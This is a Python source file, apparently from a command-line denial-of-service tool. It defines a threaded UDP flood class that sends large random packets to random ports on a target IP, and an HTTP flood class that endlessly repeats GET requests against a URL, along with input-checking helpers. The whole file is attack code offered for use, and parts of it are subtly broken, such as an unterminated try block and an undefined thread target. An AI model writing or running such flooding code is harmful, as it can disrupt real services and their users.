class udp_attack:
    def __init__(self, TCP_IP, Threads):
        s = sched.scheduler(time.time, time.sleep)
        self.count=0
        colorama.init()
        self.green = Fore.GREEN
        self.blue = Fore.BLUE
        self.gray = Fore.LIGHTBLACK_EX
        self.red = Fore.RED
        self.reset = Fore.RESET
        self.yellow = Fore.YELLOW
        self.TCP_IP = TCP_IP
        self.BUFFER_SIZE = 1024
        self.bytes = random._urandom(16000)
        self.TRAN = "\x41\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30\x30"*random.randint(0,100*2832)+"\xee\x53"
        self.s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(Threads):
            threading.Thread(target=self.main).start()
    def main(self):
        while 1:
            print(self.TCP_IP)
            t1_start = process_time()
            self.MESSAGE = "\x41\x30\x30\x30"*random.randint(0,1000)+"\xee\x53"
            TCP_PORT = random.randint(1, 5000)
            self.s.sendto(self.bytes, (self.TCP_IP, TCP_PORT))
       	    self.count += 1
            self.s.close
            t1_stop = process_time()
            print(f'[ {self.blue}= {self.reset}] sending ({self.yellow}{len(self.TRAN)}{self.reset}) Bs to {self.gray}{self.TCP_IP}:{TCP_PORT}{self.reset} ')
            print(f'[ {self.green}? {self.reset}] response time {self.gray}{t1_stop - t1_start}{self.reset}| REQS ({self.red}{self.count}{self.reset})\n')

def check_correctness_udp_spam(args):
    IP=args.ip
    Threads=args.Threads_to_spoof
    try:
        not_corect=0
        try:
            for i in IP.split('.'):
                if i.isdigit() == False:
                    not_corect+=1
        except:
            not_corect+=1
        if Threads.isdigit() == False:
            not_corect+=1
    if not_corect > 0:
        exit('[-] Incorrect input data! See "python3 exemple.py -h".')
    print('[+] Data is entered correctly.             \n[*] Loading...                ', end='\r')
    return IP, Threads

class dos:
    def __init__(self, url, threads, time):
        self.f=0
        spis=[0]
        speed=0
        for i in range(threads):
            Thread(target=send).start()
        while True:
            spis.clear()
            for i in range(3):
                f=0
                sleep(time)
                spis.append(f)
            newspeed=float(sum(spis))/3
            print(f'\r{newspeed}', end='')
    def send(self, url):
        while True:
            requests.get(url)  
            self.f+=1

def check_correctness_data_dos(args):
    url = args.URL
    Threads = args.threads
    time = args.Time
    print('[*] Checking corectness of data...                       ', end='\r')
    uncorrect=0
    try:
        get(url)
        if False == Threads.isdigit() or time.isdigit():
            uncorrect+=1
    except:
        uncorrect+=1
    if uncorrect > 0:
        exit('[-] Incorrect input data! See "python3 exemple.py -h".')
    print('[+] Data is entered correctly.             \n[*] Loading...                ', end='\r')
    return url, Threads, time
